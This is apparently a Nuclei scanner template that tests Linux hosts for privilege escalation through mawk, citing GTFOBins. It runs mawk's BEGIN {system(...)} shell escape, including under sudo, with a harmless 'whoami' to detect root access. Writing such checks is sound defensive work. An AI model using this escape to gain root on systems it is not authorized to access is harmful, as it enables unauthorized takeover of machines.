id: privesc-mawk

info:
  name: mawk - Privilege Escalation
  author: daffainfo
  severity: high
  description: |
    mawk is an efficient and fast implementation of the AWK programming language. It is designed to be smaller and faster than the original AWK implementation, making it suitable for large data processing tasks. mawk is commonly used for text processing and pattern scanning in shell scripts and command-line environments.
  reference:
    - https://gtfobins.github.io/gtfobins/mawk/
  metadata:
    verified: true
    max-request: 3
  tags: code,linux,mawk,privesc,local

self-contained: true
code:
  - engine:
      - sh
      - bash
    source: |
      whoami

  - engine:
      - sh
      - bash
    source: |
      mawk 'BEGIN {system("whoami")}'

  - engine:
      - sh
      - bash
    source: |
      sudo mawk 'BEGIN {system("whoami")}'

    matchers-condition: and
    matchers:
      - type: word
        part: code_1_response
        words:
          - "root"
        negative: true

      - type: dsl
        dsl:
          - 'contains(code_2_response, "root")'
          - 'contains(code_3_response, "root")'
        condition: or
# digest: 4a0a0047304502200d2b41bc389d94de379fb44e3a5e6da4bce373419fd5a27f57295ec9e96a780e022100d5c4841d377151b6cff3fc72e3fa9412dae4a4474fbfcf5aca154e0506269c3b:922c64590222798bb761d5b6d8e72950